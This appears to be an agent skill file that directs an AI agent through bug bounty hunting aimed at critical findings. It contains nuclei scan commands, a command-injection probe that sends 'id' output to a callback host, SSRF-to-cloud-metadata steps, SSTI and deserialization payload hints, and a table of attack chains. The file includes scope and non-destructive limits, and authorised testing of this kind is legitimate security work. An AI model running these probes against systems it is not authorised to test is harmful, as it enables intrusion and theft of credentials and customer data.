---
name: hunt-critical
description: Critical-bug-first hunting orchestrator. Use at the START of every hunt to drive the agent toward CVSS 9.0+ findings (RCE, pre-auth IDOR with PII, SSRF→IMDS, auth bypass, cross-tenant data, secret leakage with reachable impact). Enforces KEV-first scan, chain discipline, dead-end killing, and minimum-effort-per-bounty triage. Load before any wave 1 work.
---

# Hunt-Critical — Orchestrator for CVSS 9.0+ Findings

This skill enforces **one rule above all others**: every minute spent on a target must move toward a Critical-severity finding or be killed. Bug bounty programs pay 10–50× more for one Critical than ten Mediums, and triage rejects most Mediums. We optimize for **money-per-hour**, not finding count.

> **Mantra:** *PoC or GTFO. id-output or `interactsh` DNS hit, every time.*

---

## 1. The Critical-Bug Definition (program-agnostic)

A finding is Critical when **any one** of these is true:

| Impact | Example PoC bar |
|--------|-----------------|
| Unauthenticated RCE | `id` output in HTTP response OR Interactsh hit from `;curl http://collab/$(id|base64)` |
| Pre-auth admin takeover | Login as `admin` without valid creds, screenshot of admin dashboard |
| Cross-tenant PII / mass data exposure | List >10 other-tenant records (names + emails) from your low-privilege user |
| SSRF → cloud metadata creds | `sts get-caller-identity` returns role ARN, screenshot |
| Auth bypass on payment / money endpoints | Transfer between tenants, change payout details, withdraw funds |
| Stored XSS that fires in an admin/staff context | Cookie or session token exfiltrated to attacker collab |
| Persistent ATO on arbitrary user | Reset+steal session of victim account B from attacker session A |
| Source-code / credential disclosure with reachable impact | Live AWS key → S3 list of customer data, or signing key → forged session |

Everything else is **maybe Medium, probably won't pay**. See `~/.claude/CLAUDE-RULES/severity-guide.md` for full CVSS rubric.

---

## 2. The 6-Phase Critical-First Loop

Run this loop on every target. Time-box each phase. Move on aggressively.

### Phase 1 — KEV / known-CVE pass (15 minutes, NEVER skip)

Most Criticals on most targets are 1-day known-CVEs nobody patched. Always run this first.

```bash
TARGET_DIR=~/Targets/<target>
cd "$TARGET_DIR"

# 1.1 Known-exploited (CISA KEV) and very-known-exploited
nuclei -l recon/live.txt -tags kev,vkev -severity critical,high \
  -interactsh-url https://oast.pro -rl 50 -o findings/kev.txt

# 1.2 2025 / 2024 / 2023 fresh CVEs
for y in 2025 2024 2023; do
  nuclei -l recon/live.txt -t http/cves/$y/ \
    -severity critical,high -interactsh-url https://oast.pro \
    -rl 50 -o findings/cves-$y.txt
done

# 1.3 Critical product fingerprints (when present, dive deep)
nuclei -l recon/live.txt -t http/exposed-panels/ -o findings/panels.txt
```

For each panel found, immediately run the targeted skill:
- Jenkins / Hudson → `hunt-rce` § Jenkins block
- Confluence → `hunt-rce` § Confluence CVE-2023-22527
- SharePoint → `hunt-sharepoint`
- Spring Actuator → `hunt-rce` § Spring Actuator
- n8n → `hunt-rce` § CVE-2025-68613
- Werkzeug `/console` → `hunt-rce` § Werkzeug PIN
- ASP.NET ViewState → `hunt-aspnet`

**Gate:** if anything in `findings/kev.txt` is severity≥high, **stop**, validate it (Section 4), report it, then resume.

### Phase 2 — Authentication surface (20 minutes)

Auth bypass and ATO are the second-highest payer.

```bash
# 2.1 Login / signup / reset-password / SSO endpoints
grep -iE 'login|signup|register|reset|forgot|sso|oauth|saml|token|auth' recon/endpoints.txt \
  > leads/auth-endpoints.txt
```

Then load these skills sequentially (one at a time):
1. `hunt-auth-bypass` → missing checks, header spoofing, status confusion
2. `hunt-jwt` → alg=none, kid traversal, weak HMAC secret
3. `hunt-oauth` → state, redirect_uri, account-link CSRF
4. `hunt-saml` → XSW, comment injection, signature stripping
5. `hunt-mfa-bypass` → response manipulation, backup codes, race
6. `hunt-ato` → 9 paths + chains

**Critical chain to look for:** `password reset host-header injection` → leak token to attacker → reset victim password → ATO. CVSS 9.8.

### Phase 3 — SSRF→IMDS chain (15 minutes)

Most SaaS run on AWS/GCP/Azure. A single SSRF → cloud credentials → mass customer data = Critical guaranteed.

1. Load `hunt-ssrf` + `hunt-metadata-ssrf`.
2. Identify every URL-fetching surface: webhooks, avatar URLs, import-from-URL, PDF render, link unfurl, SSO redirect, OAuth dynamic client.
3. Test each with `http://<interactsh>/ssrf-FUZZ` and watch for DNS hit.
4. On any DNS hit → immediately escalate to `http://169.254.169.254/`, GCP, Azure metadata endpoints.
5. On credential capture → load `cloud-iam-deep` to enumerate scope and find the highest-impact data.

**Critical chain:** SSRF → IMDS → AWS keys → `s3 ls` reveals customer-data bucket → list 1000 PII records. CVSS 9.6.

### Phase 4 — Cross-tenant IDOR / privilege escalation (20 minutes)

IDOR alone is Medium. IDOR + cross-tenant + sensitive data = Critical.

1. Setup: 3 accounts per `~/.claude/CLAUDE-RULES/account-setup.md` (ADMIN org A, LOW org A, IDOR org B).
2. Load `hunt-bac-privesc` and `hunt-idor`.
3. For every API endpoint LOW account hits, replay from IDOR account session.
4. For every API endpoint ADMIN account hits, replay from LOW account.
5. Look for: invoice/payment data, PII (names + emails + SSN + addresses), tokens/keys, audit logs, files.
6. **One cross-tenant invoice = Critical.**

### Phase 5 — RCE primitives (30 minutes)

Now hunt for the apex finding. Load `hunt-rce` (single source for SSTI/deserialization/file-upload/cmd-injection).

Order of probability:
1. SSTI polyglot on every reflected param: `${{<%[%'"}}%\.`
2. File upload bypass matrix on every `/upload` `/avatar` `/import`
3. JNDI/Log4Shell in every common header (still hits legacy)
4. Command injection on system-interacting fields (hostname, IP, filename)
5. Deserialization on cookies/tokens starting `rO0AB` (Java), `gAS` (pickle), `BAh` (Ruby), `O:N:` (PHP)
6. XXE on every XML/SAML/SOAP/DOCX/SVG endpoint

### Phase 6 — Chains (variable, until exhausted)

Combine primitives. The chain table:

| Primitive A | + Primitive B | = Critical chain |
|-------------|---------------|------------------|
| Open redirect | OAuth `redirect_uri` not strictly validated | Steal auth code → ATO |
| SSRF | Cloud metadata reachable | IAM creds → customer data |
| IDOR | Password change w/o step-up | Persistent ATO |
| Subdomain takeover | Cookie scoped to parent domain | Cookie theft → ATO |
| Stored XSS | Fires in admin context | Admin session theft |
| File upload | Webshell extension allowed | RCE |
| XXE | OOB DTD | File read → secret → forged session |
| Path traversal | `.git/config` readable | Repo clone → secrets in history |
| Host header injection | Password reset email uses Host | Reset token to attacker |
| Mass assignment | Hidden `role` field accepted | Admin promotion |

Always escalate the lowest primitive you have toward the highest impact.

---

## 3. The Dead-End Killer

**Three strikes rule.** Same endpoint + same vuln class fails three times → kill it, log to `notes/dead-ends.md`, never retry in this session.

Concrete kills:
- WAF returned 403 to 3 distinct payload families → switch endpoint family, don't WAF-fight (use `waf-bypass.md` only if it's THE only path to Critical)
- Auth endpoint hash-validated, 3 forgery attempts → drop, hunt elsewhere
- Reflected payload appears HTML-encoded in 3 contexts → not exploitable here
- Same nuclei template times out twice → blacklist, move on

Idle is failure. Switching context is succeeding.

---

## 4. Pre-Report Gate (the 7 questions)

Before writing any report, every Critical must pass all 7. One "no" = kill or downgrade.

1. **Is the vulnerability reproducible?** — Yes, 3 times in clean sessions.
2. **Does it have real impact?** — Yes, money/PII/account/code-exec.
3. **Is it within program scope?** — Yes, per `scope.md`.
4. **Is the PoC non-destructive?** — Yes, only `id`/`whoami`/`sleep`/OOB callback.
5. **Are there known dupes?** — No (check `findings/MASTER-SUMMARY.md` + program's disclosed reports).
6. **Does it cross a trust boundary?** — Yes (anon→user, user→admin, tenant A→tenant B, internal→external).
7. **Would a triager pay without negotiation?** — Yes (PoC is unambiguous, severity is obvious).

Detailed checklist: `~/.claude/CLAUDE-RULES/validation.md`.

---

## 5. Confirmation Rules (NON-NEGOTIABLE)

### Allowed probes (safe to run unattended)
- `id`, `whoami`, `hostname`, `uname -a`, `pwd`, `printenv USER`
- `sleep 10` (timing-only)
- HTTP/DNS callback to `interactsh-client` URL with execution token in path
- `cat /etc/hostname`
- Read-only enumeration of metadata endpoints

### Banned at all times (Critical findings included)
- `rm`, `mkdir` of unknown paths, `shutdown`, `kill -9`, `iptables`
- Writing files > 10 KB
- Touching `/etc/passwd`, `~/.ssh/authorized_keys`, `crontab`
- Fork bombs, miners, persistence implants
- Anything modifying production data
- Repeated brute force (>10 attempts/min/account)

### Minimum confirmation bar
At least ONE of:
1. DNS hit on Interactsh / canarytokens / webhook.site
2. `id` (or similar safe command) output reflected in response
3. Timing delta > 5s for a `sleep N` probe
4. Direct read of a sensitive value (other-user's email, internal IP, admin token) in response

---

## 6. Token / Time Budget

| Phase | Token target | Wall-clock |
|-------|--------------|------------|
| 1. KEV | < 8k | 15 min |
| 2. Auth | < 12k | 20 min |
| 3. SSRF | < 10k | 15 min |
| 4. IDOR | < 12k | 20 min |
| 5. RCE primitives | < 20k | 30 min |
| 6. Chains | < 15k | until exhausted |

If a phase exceeds 2× its budget without a finding, write `session-state.json`, write `notes/<phase>-dead.md`, and skip to next phase.

Orchestrator never holds > 80k context. Sub-agents never hold > 60k. Truncate every raw response to 150 chars + `…`.

---

## 7. Skill Loading Order (canonical)

Load **on demand**, **one at a time**. Read-only check first; don't dive into a skill until you've hit a surface that requires it.

```
hunt-critical (this skill)             ← always loaded first
└── hunt-recon (if recon not done)
    └── per-phase skill:
        Phase 1 → security-arsenal (CVE list), hunt-sharepoint, hunt-aspnet
        Phase 2 → hunt-auth-bypass → hunt-jwt → hunt-oauth → hunt-saml → hunt-mfa-bypass → hunt-ato
        Phase 3 → hunt-ssrf → hunt-metadata-ssrf → cloud-iam-deep
        Phase 4 → hunt-bac-privesc → hunt-idor
        Phase 5 → hunt-rce → hunt-file-upload → hunt-ssti → hunt-deserialization
        Phase 6 → chain-rules from CLAUDE-RULES/
└── report-writing + triage-validation (only when a Critical is confirmed)
```

Never load > 2 skills at once at orchestrator level.

---

## 8. Self-Audit (every 30 minutes)

Ask:
1. Have I produced anything reportable in the last 30 min? If no → kill current path, switch.
2. Is what I'm doing right now likely to yield a Critical, or just a Medium? If Medium → deprioritize.
3. Is there an unchecked Critical surface from Phase 1–4 I skipped? If yes → go back.
4. Am I in a WAF-fight or filter-bypass spiral? If yes → move to a different endpoint family.

Write the answer to `session-state.json` field `self_audit_log[]`.

---

## 9. Finish Line

Stop hunting this target when **any** of:
- 2 Criticals reported AND no obvious chains remain
- All 6 phases exhausted with no finding ≥ High
- Wall-clock 6 hours total (move to next target in `~/Targets/`)
- `notes/dead-ends.md` has ≥ 50 entries (target is hardened)

Always run `~/hooks/on-session-end.sh` to save memory and back up findings.

---

## TL;DR

1. **KEV nuclei first.** Always. 15 min.
2. **Auth + SSRF + cross-tenant IDOR** before bespoke RCE hunts.
3. **Chains beat single primitives.** Open redirect alone isn't paid; open redirect → OAuth ATO is.
4. **Three strikes = dead end.** Don't WAF-fight unless it's the only Critical path.
5. **Confirm with `id` or Interactsh.** Never destructive. Never theoretical.
6. **Skip Medium.** Mediums starve programs and you. One Critical pays for the week.
